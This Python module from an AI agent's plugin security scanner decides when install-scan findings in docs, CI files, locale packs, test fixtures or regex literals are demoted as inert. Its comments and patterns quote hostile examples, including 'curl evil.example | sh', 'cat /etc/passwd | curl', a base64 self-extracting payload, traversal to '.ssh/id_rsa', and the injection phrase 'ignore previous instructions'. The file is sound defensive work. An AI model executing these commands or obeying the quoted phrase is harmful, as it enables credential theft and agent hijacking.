"""Context demotions for plugin install-scan findings (``tools.plugin_guard``).

The threat regexes in ``tools.skills_guard`` are written for a SKILL.md the agent will execute
verbatim. A plugin repository is a codebase: the same text sits in READMEs, test fixtures, JSON
scenery, denylists and regex literals, where it cannot run on the host at install time. Each
helper here recognises one such *class* of inert context and lowers the finding one step or to
informational. Nothing is deleted — every finding stays in the report with file and line — and
nothing here applies to a bundled skill's own ``SKILL.md`` / ``skills/`` tree, which the agent
does read as instructions. Every function is a pure predicate on (finding, line, path).
"""
from __future__ import annotations

import base64
import binascii
import re
from pathlib import Path
from typing import Optional

from tools.skills_guard import _COMPILED_THREAT_PATTERNS, Finding

# pattern id -> compiled regex, to locate a finding's token on its full source line.
_PATTERN_BY_ID = {pid: rx for rx, pid, *_ in _COMPILED_THREAT_PATTERNS}

# One severity step down; ``medium``/``low`` are already informational (verdict-neutral).
STEP_DOWN = {"critical": "high", "high": "medium"}

# ── (1) documentation prose ──────────────────────────────────────────────────────────────────
# A README/AGENTS.md/docs page describing a command, a refused path (``~/.ssh`` in a denylist
# table) or an uninstall step is not the plugin's runtime behaviour. Command- and path-shaped
# findings there step down once (critical→high, high→medium): a doc line can never on its own
# hard-block an install. Agent-facing shapes keep full severity because the prose IS the
# payload for them: every ``injection`` pattern, the Markdown exfil/context patterns, the
# agent-config edits, ``curl | sh`` install one-liners (a README is where those live), an
# ``authorized_keys`` append, and a leaked provider key (a real secret is a real leak anywhere).
DOC_PROSE_EXTENSIONS = {".md", ".txt", ".rst", ".html"}
_PROSE_KEEPS_FULL_SEVERITY_CATEGORIES = {"injection", "credential_exposure"}
_PROSE_KEEPS_FULL_SEVERITY_IDS = {
    "context_exfil", "send_to_url", "md_image_exfil", "md_link_exfil", "ssh_backdoor",
    "curl_pipe_shell", "wget_pipe_shell", "curl_pipe_python",
    "agent_config_mod", "agent_config_mod_shell", "agent_config_contract", "agent_config_ref",
    "hermes_config_mod", "hermes_config_mod_shell", "hermes_config_ref",
    "other_agent_config_mod", "other_agent_config_mod_shell", "other_agent_config_ref",
}
# Agent instruction surfaces inside a plugin — a bundled skill tree and the post-install note
# the agent is shown — are executed as instructions, so they get no prose cap.
_AGENT_INSTRUCTION_DIRS = {"skills", "optional-skills"}
_AGENT_INSTRUCTION_FILES = {"skill.md", "after-install.md"}


def is_doc_prose(rel_path: str) -> bool:
    """A documentation file that the loader never executes and the agent never runs as a skill."""
    p = Path(rel_path)
    if p.suffix.lower() not in DOC_PROSE_EXTENSIONS or p.name.lower() in _AGENT_INSTRUCTION_FILES:
        return False
    return not any(part.lower() in _AGENT_INSTRUCTION_DIRS for part in p.parts[:-1])


# A repository's CI pipeline (``.github/workflows/*.yml``) runs on the forge's runner, never on the
# host that installs the plugin, and the agent never reads it as instructions. Its ``os.environ``
# reads (``RUNNER_TEMP``, ``GITHUB_ENV``) and ``pip install`` steps are the CI's own plumbing, so
# it takes the same one-step prose cap as a README: visible, confirmable, never a hard block on
# its own. Only the workflow directory proper — a ``.github/scripts/*.py`` is real code.
_CI_WORKFLOW_SUFFIXES = {".yml", ".yaml"}


def is_ci_workflow(rel_path: str) -> bool:
    """A forge CI workflow definition: ``.github/workflows/<name>.yml`` or a GitLab ``.gitlab-ci.yml``.
    Both run on the forge's runner, never on the host that installs the plugin, and the agent never
    reads them as instructions, so they take the README prose cap (``os.environ`` reads, ``pip install``
    steps and ``curl | sh`` of a CI tool are the pipeline's own plumbing)."""
    p = Path(rel_path)
    if p.name.lower() == ".gitlab-ci.yml":
        return True
    return (len(p.parts) == 3 and p.parts[0].lower() == ".github" and p.parts[1].lower() == "workflows"
            and p.suffix.lower() in _CI_WORKFLOW_SUFFIXES)


def is_agent_facing(finding: Finding) -> bool:
    """A shape whose prose IS the payload (injection, agent-config edit, install one-liner, leaked key)."""
    return (finding.category in _PROSE_KEEPS_FULL_SEVERITY_CATEGORIES
            or finding.pattern_id in _PROSE_KEEPS_FULL_SEVERITY_IDS)


def prose_cap(finding: Finding) -> Optional[str]:
    """Stepped-down severity for a command/path-shaped finding in documentation, else None."""
    return None if is_agent_facing(finding) else STEP_DOWN.get(finding.severity)


# ── (1c) documented ``curl | sh`` of a known installer ───────────────────────────────────────
# ``curl_pipe_shell`` keeps full severity in prose because a README — and a CI workflow — is exactly
# where a malicious download-and-execute one-liner would be planted (``curl evil.example | sh`` in a
# ``.github/workflows`` step stays ``high``). The documented, non-attack shape is a pipe whose URL is a
# NAMED trusted installer: Hermes' own ``install.sh``, a named upstream runtime (``ollama.com``,
# ``bun.sh``, ``get.docker.com``, ``sh.rustup.rs`` …), a named dev-tool CLI (``app.factory.ai``), or a
# GitHub ``raw`` URL whose path is an ``install`` script. That lands at medium (a note). An unpinned /
# unknown third-party domain — the attack shape — keeps full severity, in README, code, OR CI.
_PIPE_TO_SHELL_IDS = {"curl_pipe_shell", "wget_pipe_shell", "curl_pipe_python"}
_URL_IN_LINE = re.compile(r'https?://([^\s/"\'`)]+)([^\s"\'`)]*)')
_TRUSTED_INSTALLER_HOSTS = {
    "hermes-agent.nousresearch.com", "ollama.com", "bun.sh",
    "get.docker.com", "sh.rustup.rs", "deno.land", "astral.sh", "app.factory.ai",
}


def _is_trusted_installer_url(host: str, path: str) -> bool:
    host = host.lower()
    if host in _TRUSTED_INSTALLER_HOSTS:
        return True
    # A GitHub raw URL is user-controlled, so only an ``install``-named script path qualifies
    # (``.../scripts/install.sh``, ``.../install-plugin.sh``), never an arbitrary payload.
    return host == "raw.githubusercontent.com" and "install" in path.lower()


def is_trusted_installer_pipe(finding: Finding, line: str) -> bool:
    """A ``curl|sh`` finding whose every ``http(s)://`` URL is a named trusted installer — a documented
    install step, not an attack. An unknown domain anywhere on the line disqualifies the whole line."""
    if finding.pattern_id not in _PIPE_TO_SHELL_IDS:
        return False
    urls = [(m.group(1), m.group(2)) for m in _URL_IN_LINE.finditer(line)]
    return bool(urls) and all(_is_trusted_installer_url(h, p) for h, p in urls)


# ── (1b) language-pack catalogs ─────────────────────────────────────────────────────────────
# ``locales/<lang>[.tui|.desktop].yaml`` in a ``provides_locales`` plugin is user-facing UI text
# the loader reads as string leaves and shows to a human; nothing in it is executed or edits a
# file, so the agent-config/hermes-config family steps down like any other prose (the bundled
# ``en.yaml`` itself matches ``updating: "... AGENTS.md"``). Injection shapes and leaked keys
# keep full severity: a pack can still carry model-directed text.
_CATALOG_STEPS_DOWN_IDS = {
    "agent_config_mod", "agent_config_mod_shell", "agent_config_contract", "agent_config_ref",
    "hermes_config_mod", "hermes_config_mod_shell", "hermes_config_ref",
    "other_agent_config_mod", "other_agent_config_mod_shell", "other_agent_config_ref",
}
_LOCALE_CATALOG_SUFFIXES = {".yaml", ".yml"}


def is_locale_catalog(rel_path: str) -> bool:
    """A ``locales/<name>.yaml`` catalog at the plugin root."""
    p = Path(rel_path)
    return len(p.parts) == 2 and p.parts[0].lower() == "locales" and p.suffix.lower() in _LOCALE_CATALOG_SUFFIXES


def catalog_cap(finding: Finding) -> Optional[str]:
    """Stepped-down severity for a finding inside a locale catalog, else None. The agent-config family
    is a translated UI STATUS STRING there (``updating: "… AGENTS.md …"``) — the pack cannot write a
    file — so it caps to a note (medium), not merely one step; other shapes take the one-step prose cap."""
    if finding.pattern_id in _CATALOG_STEPS_DOWN_IDS:
        rank = {"low": 0, "medium": 1, "high": 2, "critical": 3}
        return finding.severity if rank.get(finding.severity, 0) <= rank["medium"] else "medium"
    return prose_cap(finding)


# A README "Uninstall" section removing the plugin's OWN install directory under ``~/.hermes`` is the one
# destructive shape that is harmless by construction: one ``rm``, every operand rooted at
# ``$HOME``/``${HOME}``/``~`` + ``/.hermes/`` with a plain segment path and a plain leaf — no glob, no
# ``..``, nothing chained. Documented shapes: ``plugins/<name>`` / ``skills/<name>``, a profile-scoped
# ``profiles/<profile>/{plugins,roles,...}/<name>``, ``desktop-plugins/<name>``, and the plugin's own
# data dir ``~/.hermes/<name>`` — and up to a few such operands on one line (``rm -rf ~/.hermes/profiles/N/plugins/crew
# ~/.hermes/profiles/N/roles/crew``). It lands at medium (a note). A wider target (``$HOME``, ``$HOME/.hermes``,
# ``$HOME/.hermes/plugins/*``) only gets the generic prose step (high, caution) and the same line in a ``.sh``
# stays critical (#115353).
_UNINSTALL_HOME = r'(?:\$HOME|\$\{HOME\}|~)/\.hermes'


def _uninstall_operand(group: str) -> str:
    """One ``~/.hermes/<segments>/<leaf>`` operand, optionally quoted (quote tracked by *group*)."""
    return (rf'(?P<{group}>["\']?)' + _UNINSTALL_HOME
            + rf'(?:/[A-Za-z0-9][A-Za-z0-9._-]*)+/?(?P={group})')


# ``rm`` plus one or more such operands on the line (``crew`` deletes a plugins dir and a roles dir):
# distinct capture-group names so the optional-quote backreferences do not collide.
_SELF_UNINSTALL_RM = re.compile(
    r'^(?:\$\s*)?rm\s+(?:-[a-zA-Z]+\s+)*'
    + _uninstall_operand("q0")
    + r'(?:\s+' + _uninstall_operand("q1") + r')*'
    + r'\s*(?:#.*)?$'
)

# The same shape embedded in a backtick code span mid-prose (``… When you're done, `rm -rf
# ~/.hermes/profiles/lancedb-demo` removes all trace``): the span must contain ONLY the ``rm`` and its
# ``~/.hermes`` operands and then close (no chaining, no ``&&``, no trailing command), so a chained or
# force-push example (``rm -rf ~/x && git push --force``) does not qualify.
_SELF_UNINSTALL_RM_IN_SPAN = re.compile(
    r'`(?:\$\s*)?rm\s+(?:-[a-zA-Z]+\s+)*'
    + _uninstall_operand("q2")
    + r'(?:\s+' + _uninstall_operand("q3") + r')*\s*`'
)


def is_self_uninstall_doc(finding: Finding, line: str) -> bool:
    if finding.pattern_id != "destructive_home_rm":
        return False
    stripped = line.strip()
    return (_SELF_UNINSTALL_RM.match(stripped) is not None
            or _SELF_UNINSTALL_RM_IN_SPAN.search(line) is not None)


# ── (2) test trees and fixtures ──────────────────────────────────────────────────────────────
# Test code and fixtures deliberately hold hostile strings (``rm -rf /`` in a DENY table,
# ``/etc/passwd`` in a traversal probe, a fake ``sk-`` key in a redaction corpus) to prove the
# plugin rejects them. They are still scanned — ``from .tests import evil`` would run — but a
# finding there steps down once, so a fixture cannot hard-block and a string-only fixture is
# a note. A root-level test dir (``tests/``, ``fixtures/``) or the unambiguous dunder names at any
# depth (``src/__tests__/``), plus test-file naming (``foo.test.js``, ``test_foo.py``, and the
# plural ``tests_state.py`` / ``state_tests.py`` a single-module plugin uses when it has no
# ``tests/`` dir); a nested ``src/spec/handler.py`` is runtime code and gets no cap.
TEST_TREE_DIRS = {"tests", "test", "testing", "spec", "specs", "fixtures"}
_TEST_DIRS_ANY_DEPTH = {"__tests__", "__fixtures__", "__mocks__"}
_TEST_FILE_NAME = re.compile(r"^(?:tests?_[^/]*|[^/]*_tests?\.[^./]+|[^/]*\.(?:test|spec)\.[^./]+)$", re.IGNORECASE)


# In a test file, a hostile string that is only DATA — quoted, with no exec verb on the line
# (``verdict_for("rm -rf /")``, ``("/etc/passwd", "DENY")``) — is a note; a fixture file that is
# not code at all (``corpus.json``) likewise. ``os.system('rm -rf /')`` or ``open('/etc/passwd')``
# in a test still steps down only once: the line executes when imported.
_EXEC_ON_LINE = re.compile(
    r"\b(?:system|popen|run|call|check_output|check_call|Popen|exec|execv\w*|spawn\w*|eval|execSync|execFile\w*"
    r"|spawnSync|child_process|source|os\.startfile|open)\s*\(|\$\(|(?<![\w\\])`", re.IGNORECASE)


# In Python/JS/TS a quote never runs a command, so ``$(whoami)`` or a backtick INSIDE a string
# literal (``'; rm -rf / ; $(whoami) `id`'`` in a hostile-input table) is data, not an exec marker;
# the call that would run it (``os.system(``, ``exec(``) sits outside the literal and still counts.
# Shell-like files keep the raw line: there ``"$(id)"`` executes inside double quotes.
_QUOTES_NEVER_EXECUTE_SUFFIXES = {".py", ".pyi", ".js", ".mjs", ".cjs", ".jsx", ".ts", ".mts", ".cts", ".tsx"}

# An exec call whose FIRST argument is a string literal runs that literal: ``os.system('rm -rf /')``,
# ``open('/etc/passwd')``, ``exec("code")``. A test dispatcher that passes the hostile string as a
# LATER argument or nested in a dict — ``call(core.detail, "/etc/passwd")``, ``call('read_file',
# {'path': '/etc/passwd'})`` — hands it as data to a mock and does not run it. ``call``/``run`` are in
# the exec list for ``subprocess.call``/``.run``, but a bare test helper named ``call()`` collides with
# it; keying on first-argument position distinguishes the two without dropping a real exec.
_EXEC_CALL_OPEN = re.compile(
    r"\b(?:system|popen|run|call|check_output|check_call|Popen|exec|execv\w*|spawn\w*|eval|execSync"
    r"|execFile\w*|spawnSync|source|os\.startfile|open)\s*\(\s*", re.IGNORECASE)


def _exec_first_arg_literal_spans(line: str, spans: list[tuple[int, int]]) -> list[tuple[int, int]]:
    """Literal spans that sit as the direct first argument of an exec call (``open('<lit>')``)."""
    out = []
    for m in _EXEC_CALL_OPEN.finditer(line):
        span = next(((a, b) for a, b in spans if a == m.end()), None)
        if span is not None:
            out.append(span)
    return out


def _executes(line: str, rel_path: str) -> bool:
    if Path(rel_path).suffix.lower() in _QUOTES_NEVER_EXECUTE_SUFFIXES:
        line = _LITERAL_SPANS.sub(lambda m: m.group(0)[0] + " " * (len(m.group(0)) - 2) + m.group(0)[-1], line)
    return _EXEC_ON_LINE.search(line) is not None


def is_inert_fixture_line(finding: Finding, line: str, is_code: bool, rel_path: str = "") -> bool:
    """The finding's text is quoted test data that nothing on the line runs: every hit is inside a
    string literal, and no such literal is the direct first argument of an exec call. A literal passed
    as a later argument / nested in a dict to a test dispatcher (``call(x, "/etc/passwd")``) is data;
    ``open('/etc/passwd')`` — the literal as open's first arg — executes and is not inert."""
    if not is_code:
        return True
    rx = _PATTERN_BY_ID.get(finding.pattern_id)
    hits = list(rx.finditer(line)) if rx else []
    if not hits:
        return False
    spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
    exec_arg_spans = _exec_first_arg_literal_spans(line, spans)
    # A non-call exec marker on the line (``$(`` substitution, a shell backtick, a bare ``exec_marker``
    # with no literal first arg, e.g. ``os.system(payload)`` naming a variable) still executes.
    non_literal_exec = _executes(line, rel_path) and not _EXEC_CALL_OPEN.search(line)

    def quoted_data(h: re.Match[str]) -> bool:
        span = next(((a, b) for a, b in spans if a <= h.start() and h.end() <= b), None)
        return span is not None and span not in exec_arg_spans

    return not non_literal_exec and all(quoted_data(h) for h in hits)


def is_test_tree(rel_path: str) -> bool:
    p = Path(rel_path)
    return (
        (len(p.parts) > 1 and p.parts[0].lower() in TEST_TREE_DIRS)
        or any(part.lower() in _TEST_DIRS_ANY_DEPTH for part in p.parts[:-1])
        or _TEST_FILE_NAME.match(p.name) is not None
    )


# ── (3) base64 media data ────────────────────────────────────────────────────────────────────
# ``encoded_exfil`` (``base64 … env``) fires on a data URI whose payload happens to contain the
# letters "env" (PNG scenery, embedded fonts). Decode the head of the blob and sniff it: a
# known image/font/audio/document magic number means the bytes are an asset, not an encoder
# call, and the finding drops to informational (kept in the report).
_BASE64_RUN = re.compile(r"(?:base64,)?([A-Za-z0-9+/]{24,}={0,2})")
_MEDIA_MAGIC = (
    b"\x89PNG", b"\xff\xd8\xff", b"GIF8", b"RIFF", b"wOFF", b"wOF2", b"OTTO", b"\x00\x01\x00\x00",
    b"ttcf", b"BM", b"%PDF", b"\x00\x00\x01\x00", b"<svg", b"<?xml", b"ID3", b"OggS", b"fLaC", b"\x1a\x45\xdf\xa3",
)


def _decoded_head(blob: str) -> bytes:
    head = blob[:16]
    head = head[: len(head) - len(head) % 4]
    try:
        return base64.b64decode(head, validate=True)
    except (binascii.Error, ValueError):
        return b""


def is_base64_media(line: str) -> bool:
    """The line's first long base64 run decodes to a recognised media/document header."""
    for m in _BASE64_RUN.finditer(line):
        if _decoded_head(m.group(1)).startswith(_MEDIA_MAGIC):
            return True
    return False


# ── (3b) a base64 encode→decode round-trip of a freshly-created archive ─────────────────────────
# ``base64_decode_pipe`` flags ``base64 -d | tar`` as the embedded-payload attack (``tail "$0" |
# base64 -d | tar x`` self-extracts a blob the scanner never sees). A base64 TRANSPORT of a
# freshly-made archive — ``tar czf - … | base64 … | base64 -d | tar xzf - -C "$DEST"`` over SSH — is
# data movement: the archive is CREATED on the line (``tar c…``) and the base64 is an ENCODE feeding a
# matching DECODE (round-trip), not an opaque embedded blob. Such a line is a note. The embedded-blob
# attack (decode only, no ``tar c``/no prior ``base64`` encode) keeps full severity.
_B64_ROUNDTRIP = re.compile(
    r'\bbase64\b(?![^\n|;&]*(?:-[a-z]*d[a-z]*|--decode))[^\n]*\|[^\n]*'
    r'\bbase64\s+(?:-[^\s|]+\s+)*?(?:-[a-z]*d[a-z]*|--decode)\b', re.IGNORECASE)
_TAR_CREATE = re.compile(r'\btar\s+(?:-?-?create\b|-?-?c[a-z]*f?\b|c[a-z]*f?\b)', re.IGNORECASE)


def is_base64_archive_roundtrip(finding: Finding, line: str) -> bool:
    """A ``base64_decode_pipe`` line that both CREATES an archive (``tar c``) and does a base64
    encode→decode round-trip — a transport, not an opaque embedded payload."""
    if finding.pattern_id != "base64_decode_pipe":
        return False
    return bool(_B64_ROUNDTRIP.search(line)) and bool(_TAR_CREATE.search(line))


# ── (5)/(6) alternation tokens inside string or regex literals in code ──────────────────────
# ``sudo`` in ``/clarify|approval|sudo|secret/.test(value)`` classifies an event name; ``env|``
# in ``re.compile(r"(?:api[_-]?key|…|env|headers)")`` is a redaction regex; ``"printenv",`` in
# ``_READ_ONLY_COMMANDS = frozenset({"pwd", "ls", …, "printenv"})`` is a denylist/allowlist entry;
# ``mkfs`` in ``re.compile(r"\b(?:rm|rmdir|shred|mkfs|dd)\b")`` is a guard plugin's OWN denylist
# (an un-overridable ``dangerous`` on the plugin whose job is to refuse that command).
# The shape that is inert is narrow: the word sits inside a quoted string or regex literal AND is
# either an alternation member (``|sudo|``, ``(sudo|``, ``|env|``) or the ENTIRE literal
# (``"printenv"``, ``'sudo'``) on a line that executes nothing. A command string such as
# ``"sudo apt install x"``, ``"env | grep KEY"`` or ``"mkfs.ext4 /dev/sda1"`` inside a
# ``subprocess.run(...)`` literal is how an attack is written and never qualifies. Only
# word-shaped patterns are eligible.
LITERAL_INERT_PATTERN_IDS = {"sudo_usage", "dump_all_env", "format_filesystem"}
_LITERAL_SPANS = re.compile(
    r"""(?P<s>[rRbBuUfF]{0,2}"(?:[^"\\\n]|\\.)*"|[rRbBuUfF]{0,2}'(?:[^'\\\n]|\\.)*'|`(?:[^`\\\n]|\\.)*`)"""
    r"""|(?P<rx>(?<![\w)\]])/(?:[^/\\\n\[]|\\.|\[(?:[^\]\\\n]|\\.)*\])+/[dgimsuvy]*(?![A-Za-z]))"""  # js regex literal
)
# The regex-literal branch accepts only real JS flags: with ``[a-z]*`` a bare Unix path lexed as a
# literal (``/etc/`` + flags ``passwd``) and an unquoted ``cat /etc/passwd | curl …`` in a test
# script scored as inert data.
_PATTERN_TOKEN = {
    "sudo_usage": re.compile(r"\bsudo\b"), "dump_all_env": re.compile(r"printenv|env\s*\|"),
    "format_filesystem": re.compile(r"\bmkfs\b"),
}


def _is_alternation_member(line: str, start: int, end: int) -> bool:
    before = line[start - 1] if start > 0 else ""
    after = line[end] if end < len(line) else ""
    return before in "|(" or after in "|)"


def _is_whole_literal(line: str, start: int, end: int, span: tuple[int, int]) -> bool:
    """The token is the entire quoted content of the literal it sits in (``"printenv"``)."""
    a, b = span
    return start == a + 1 and end == b - 1 and line[a] in "\"'`" and not _EXEC_ON_LINE.search(line)


def is_regex_alternation_token(finding: Finding, line: str) -> bool:
    """Every occurrence of the finding's token sits inside a literal as an alternation member
    or as the whole literal (a list entry) on a line that executes nothing."""
    token = _PATTERN_TOKEN.get(finding.pattern_id)
    if token is None:
        return False
    spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
    hits = list(token.finditer(line))

    def inert(h: re.Match[str]) -> bool:
        if " " in h.group(0):
            return False
        span = next(((a, b) for a, b in spans if a <= h.start() and h.end() <= b), None)
        if span is None:
            return False
        return _is_alternation_member(line, h.start(), h.end()) or _is_whole_literal(line, h.start(), h.end(), span)

    return bool(hits) and all(inert(h) for h in hits)


# ── (5b) ``sudo`` in advisory text or a safety disclaimer ─────────────────────────────────────
# ``sudo_usage`` fires on the bare word. Two shapes are not privilege escalation: (a) an advisory
# INSTALL/ADMIN HINT the plugin prints/returns — ``return "sudo apt install pass"``, ``"sudo snap
# install bw"``, ``f"sudo systemctl restart …"`` — ``sudo`` immediately followed by a package manager
# or admin tool (apt/snap/dnf/systemctl/…) or a ``sudo`` option, inside a string literal on a line
# that executes nothing; and (b) a SAFETY DISCLAIMER that forbids it — ``Never ask the user for a sudo
# password``, ``no permissions, xattrs, sudo`` — where a negation governs the word. Both land at medium
# (a note), CODE files only. A bare command string (``"please run sudo id"``), a ``["sudo", "id"]`` args
# element, a ``subprocess.run(["sudo", ...])`` call, and a real ``sudo apt-get install`` line in a shell
# script keep full severity (the first two are handled on data files by ``is_json_prose_value``).
_SUDO_TOKEN = re.compile(r"\bsudo\b(?!\.\w)")
_SUDO_ADMIN_HINT = re.compile(
    r"\bsudo\s+(?:-[A-Za-z]+\b\s+)*(?:apt|apt-get|snap|dnf|yum|pacman|zypper|apk|brew|port|emerge"
    r"|systemctl|service|launchctl|pip[0-9]*|npm|gem|-u\b|-E\b|-H\b|-n\b)", re.IGNORECASE)
# ``(?:sudo\s+)?(?:git|…)`` — ``sudo`` inside a REGEX pattern string (the literal ``\s`` whitespace
# metacharacter marks it as the plugin's OWN command-parser regex, never a real invocation).
_SUDO_IN_REGEX = re.compile(r"\(\?:?\s*sudo\\s", re.IGNORECASE)
_SUDO_NEGATION = re.compile(
    r"\b(?:never|not|no|without|don'?t|cannot|can'?t|avoid|refus\w*|forbid\w*|disallow\w*)\b",
    re.IGNORECASE)


def _sudo_in_safety_clause(line: str, start: int) -> bool:
    """A negation word governs this ``sudo`` — anywhere earlier in the sentence, or in the
    short clause right after it (``no permissions, xattrs, sudo``)."""
    before = line[:start]
    # restrict to the current sentence/clause so a negation two sentences back does not leak in
    clause = re.split(r"[.;]", before)[-1]
    return _SUDO_NEGATION.search(clause) is not None


def is_sudo_inert(finding: Finding, line: str, rel_path: str) -> bool:
    """Every ``sudo`` on the line is an advisory install/admin HINT inside a non-executing string
    literal, or is governed by a safety negation. A bare ``sudo <cmd>`` command string (``"sudo id"``,
    a ``["sudo", "id"]`` args element) is not an admin hint and is not demoted — on JSON data files
    those are handled (and kept at severity) by ``is_json_prose_value``."""
    if finding.pattern_id != "sudo_usage":
        return False
    hits = list(_SUDO_TOKEN.finditer(line))
    if not hits:
        return False
    executes = _executes(line, rel_path)
    spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
    admin_hint = {m.start() for m in _SUDO_ADMIN_HINT.finditer(line)}
    in_regex = _SUDO_IN_REGEX.search(line) is not None

    def inert(h: re.Match[str]) -> bool:
        in_literal = any(a <= h.start() and h.end() <= b for a, b in spans)
        if in_literal and not executes and (h.start() in admin_hint or in_regex):
            return True
        return _sudo_in_safety_clause(line, h.start())

    return all(inert(h) for h in hits)


# ── (5b2) ``env``/``printenv`` in a safety disclaimer ────────────────────────────────────────────
# ``dump_all_env`` fires on ``env |``/``printenv``. A SKILL.md safety rule forbidding it —
# ``**Never inspect the environment.** Do not run `env`, `printenv`, `set` …`` (the official
# nvidia-broadcast skill) — is the opposite of an env dump. When every ``dump_all_env`` hit on the line
# is governed by a safety negation (``never``/``do not``/``no`` …), the finding is a note. A real
# ``env | curl …`` keeps full severity (no negation governs it).
_ENV_DUMP_TOKEN = re.compile(r"printenv|(?<![A-Za-z0-9_])env\s*\|(?!\|)(?!\s*[{(])")


def is_env_dump_in_safety_clause(finding: Finding, line: str) -> bool:
    """Every ``dump_all_env`` hit on the line is governed by a safety negation (a "never/do not" rule)."""
    if finding.pattern_id != "dump_all_env":
        return False
    hits = list(_ENV_DUMP_TOKEN.finditer(line))
    return bool(hits) and all(_sudo_in_safety_clause(line, h.start()) for h in hits)


# ── (5c) a documented injection PHRASE that the plugin's own filter refuses ─────────────────────
# A context/memory plugin's CHANGELOG or a ``#``/``//`` code comment names the exact phrase its
# validator rejects (``"ignore previous instructions"``), and a build note shows a role-label example
# in a backtick span (`` `User: ignore previous instructions` ``). Quoted that way, inside a defensive
# doc (comment / CHANGELOG), the phrase is a description of a defense, not an instruction — it caps to a
# note rather than the one-step comment cap. An UNQUOTED injection in a README/SKILL.md prose line, or
# a quoted phrase outside a comment/CHANGELOG, keeps full severity.
_INJECTION_PHRASE_IDS = {"prompt_injection_ignore", "disregard_rules"}
_QUOTED_SPAN = re.compile(r'"[^"\n]*"|\'[^\'\n]*\'|`[^`\n]*`|«[^»\n]*»|“[^”\n]*”|‘[^’\n]*’')


def is_quoted_injection_phrase(finding: Finding, line: str) -> bool:
    """The finding's injection phrase sits entirely inside a quoted/backtick span on the line."""
    if finding.pattern_id not in _INJECTION_PHRASE_IDS:
        return False
    rx = _PATTERN_BY_ID.get(finding.pattern_id)
    if rx is None:
        return False
    spans = [m.span() for m in _QUOTED_SPAN.finditer(line)]
    hits = list(rx.finditer(line))
    return bool(hits) and all(any(a <= h.start() and h.end() <= b for a, b in spans) for h in hits)


# ── (6) repo-root traversal in a build/setup script ─────────────────────────────────────────────
# ``path_traversal_deep`` (``../../..``) fires on build-script repo-root resolution:
# ``resolve(import.meta.dir, '../../..')``, ``cd "$SCRIPT_DIR/../../.."``, ``.../../../..`` — climbing
# out of a nested package to the repository root. Those ``..`` segments resolve to a known ancestor of
# the plugin, not into a victim's tree. When every ``../../..`` run on the line is followed only by
# more ``..``/path separators or a quote/paren (no SENSITIVE leaf — ``etc``, ``passwd``, ``shadow``,
# ``.ssh``, ``.aws``, ``.env``, ``.hermes``, ``.gnupg``, ``.kube``, ``.docker``, ``.npmrc`` …), the
# finding is a note. A traversal INTO a sensitive path (``../../../etc/passwd``, ``../../../.ssh/id_rsa``)
# keeps full severity.
_TRAVERSAL_RUN = re.compile(r"(?:\.\./)+\.\.")
_SENSITIVE_AFTER_TRAVERSAL = re.compile(
    r"(?:/|\\)*(?:etc\b|passwd\b|shadow\b|\.ssh\b|\.aws\b|\.env\b|\.hermes\b|\.gnupg\b|\.kube\b"
    r"|\.docker\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.config\b|proc\b|root\b|home\b|var\b|usr\b|sys\b)",
    re.IGNORECASE)


def is_repo_root_traversal(finding: Finding, line: str) -> bool:
    """Every ``../../..`` run on the line climbs to an ancestor dir, with no sensitive leaf after it."""
    if finding.pattern_id != "path_traversal_deep":
        return False
    runs = list(_TRAVERSAL_RUN.finditer(line))
    if not runs:
        return False
    for m in runs:
        # skip trailing ``../`` / ``..`` segments, then look at what the path continues into
        rest = line[m.end():]
        rest = re.sub(r"^(?:/?\.\.)*/?", "", rest)
        if _SENSITIVE_AFTER_TRAVERSAL.match(rest):
            return False
    return True


# ── (6b) a lazy ``__import__("os")`` reading one benign member ───────────────────────────────────
# ``python_import_os`` flags ``__import__("os")`` as obfuscation. A one-off lazy import that reads a
# SINGLE benign os member — ``__import__("os").environ.get("X")`` (env override), ``__import__("os").
# fsync(fd)`` (durable write) — is a readability shortcut, not obfuscated code execution. It caps to a
# note when the attribute immediately after the import is a known read-only member and the line names
# no dangerous os call (``system``/``popen``/``exec*``/``spawn*``/``remove``/``unlink``) and no exec marker.
_IMPORT_OS = re.compile(r'__import__\s*\(\s*["\']os["\']\s*\)\s*\.\s*(\w+)')
_BENIGN_OS_MEMBERS = {
    "environ", "getenv", "fsync", "fspath", "path", "sep", "linesep", "name", "getcwd", "getpid",
    "getppid", "urandom", "cpu_count", "uname", "stat", "listdir", "scandir", "walk", "access",
    "isatty", "get_terminal_size", "devnull", "curdir", "pardir", "extsep", "altsep", "pathsep",
}
_DANGEROUS_OS_ON_LINE = re.compile(
    r'\bos\s*\.\s*(?:system|popen|exec\w*|spawn\w*|remove|unlink|rmdir|removedirs)\b'
    r'|__import__\s*\(\s*["\']os["\']\s*\)\s*\.\s*(?:system|popen|exec\w*|spawn\w*|remove|unlink|rmdir)\b')


def is_benign_lazy_os_import(finding: Finding, line: str) -> bool:
    """Every ``__import__("os").<attr>`` on the line reads a benign os member, with no dangerous os
    call and no exec marker on the line."""
    if finding.pattern_id != "python_import_os":
        return False
    members = [m.group(1) for m in _IMPORT_OS.finditer(line)]
    if not members or _DANGEROUS_OS_ON_LINE.search(line) or _EXEC_ON_LINE.search(line):
        return False
    return all(a in _BENIGN_OS_MEMBERS for a in members)


# ── (6c) a disclosed, scoped config-write NOTE in install docs ───────────────────────────────────
# ``hermes_config_mod`` (the prose-intent tier, ``high``) fires on install docs that transparently state
# the plugin writes its OWN scoped config section — ``after-install.md``: "Write ``memory.provider:
# mindgraph`` to ``~/.hermes/config.yaml``", a README "writes **only** the ``memlock:`` section". A
# README already takes the generic prose cap; ``after-install.md`` is agent-facing and does not, yet a
# disclosed scoped write is a reviewable behaviour, not an attack. The PROSE tier on a doc/after-install
# file caps to a note (medium): the finding stays visible, the verdict is not blocked. The MECHANICAL
# shell-write tier (``hermes_config_mod_shell``, ``>>``/``sed -i``/``tee`` into config.yaml) is never
# demoted here and keeps full severity.
_DISCLOSED_CONFIG_PROSE_IDS = {"hermes_config_mod"}
_AGENT_DOC_NAMES = {"after-install.md"}


def is_disclosed_config_note(finding: Finding, rel_path: str) -> bool:
    """A prose-intent config-mod finding on an install-doc surface (README-like ``.md`` or
    ``after-install.md``); the mechanical shell-write tier is excluded by pattern id."""
    if finding.pattern_id not in _DISCLOSED_CONFIG_PROSE_IDS:
        return False
    p = Path(rel_path)
    return p.suffix.lower() == ".md" or p.name.lower() in _AGENT_DOC_NAMES


# ── (6d) an ``authorized_keys`` MENTION with no write action ──────────────────────────────────────
